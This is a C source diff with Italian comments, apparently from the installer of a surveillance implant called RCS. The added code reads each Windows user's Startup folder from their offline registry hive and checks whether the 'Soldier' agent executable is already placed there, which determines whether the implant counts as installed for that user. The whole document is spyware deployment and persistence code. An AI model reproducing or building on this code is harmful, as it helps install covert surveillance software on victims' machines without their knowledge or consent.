@@ -71,6 +71,14 @@ DWORD WIN_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info)
 	WCHAR *rcs_reg = NULL;
 	HANDLE hfile;
 
+	// Controlla se esiste il Soldier. Altrimenti prosegue a cercare l'elite
+	swprintf_s(rcs_dir, MAX_PATH, L"%s\\%s.exe", user_info->user_startup, rcs_info->soldier_name);
+	hfile = CreateFile(rcs_dir, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hfile);
+		return RCS_INSTALLED;
+	}
+
 	// Controlla se esiste la chiave nel registry
 	ReadRegValue(L"RCS_NTUSER\\software\\microsoft\\windows\\currentversion\\runonce", rcs_info->hreg, NULL, &rcs_reg);
 	if (rcs_reg) {
@@ -124,6 +132,7 @@ users_struct_t *WIN_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
 	WCHAR *user_sid = NULL;
 	WCHAR *temp_home = NULL, *user_home = NULL;
 	WCHAR *user_temp = NULL;
+	WCHAR *user_startup = NULL;
 	WCHAR *tmp_ptr;
 	DWORD i, RID;
 	WCHAR tmp_buf[1024];
@@ -196,10 +205,31 @@ users_struct_t *WIN_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
 		}
 		SAFE_FREE(temp_home);
 
+		// Legge la directory di StartUp dell'utente
+		ReadRegValue(L"RCS_NTUSER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\", L"Startup", NULL, &temp_home);
+		if (!temp_home) {
+			SAFE_FREE(user_sid);
+			SAFE_FREE(user_home);
+			SAFE_FREE(user_temp);
+			RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
+			continue;
+		}
+		if (!(tmp_ptr = wcschr(temp_home, L'\\')) || !(user_startup = (WCHAR *)calloc(1, MAX_PATH * sizeof(WCHAR)))) {
+			SAFE_FREE(temp_home);
+			SAFE_FREE(user_sid)
+			SAFE_FREE(user_home);
+			SAFE_FREE(user_temp);
+			RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
+			continue;
+		}
+		swprintf_s(user_startup, MAX_PATH-1, L"%s%s", os_info->drive, tmp_ptr+1);
+		SAFE_FREE(temp_home);
+
 		// Verifica che esista la temp
 		swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"%s%s", user_home, user_temp);
 		hfile = CreateFile(tmp_buf, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
 		if (hfile == INVALID_HANDLE_VALUE) {
+			SAFE_FREE(user_startup);
 			SAFE_FREE(user_temp);
 			SAFE_FREE(user_sid)
 			SAFE_FREE(user_home);
@@ -211,6 +241,7 @@ users_struct_t *WIN_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
 		// Ora possiamo allocare la struttura perchè RCS è installabile
 		// su quest'utente
 		if ( !(*list_curr = (users_struct_t *)malloc(sizeof(users_struct_t))) ) {
+			SAFE_FREE(user_startup);
 			SAFE_FREE(user_temp);
 			SAFE_FREE(user_sid)
 			SAFE_FREE(user_home);
@@ -222,6 +253,7 @@ users_struct_t *WIN_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
 		memset((*list_curr), 0, sizeof(users_struct_t));
 		(*list_curr)->user_home = user_home;
 		(*list_curr)->user_temp = user_temp;
+		(*list_curr)->user_startup = user_startup;
 		(*list_curr)->user_local_settings = GetLocalSettings(user_temp);
 		(*list_curr)->user_hash = GetUserHash(user_sid);
 		(*list_curr)->rcs_status = WIN_GetUserRCSStatus((*list_curr), rcs_info);
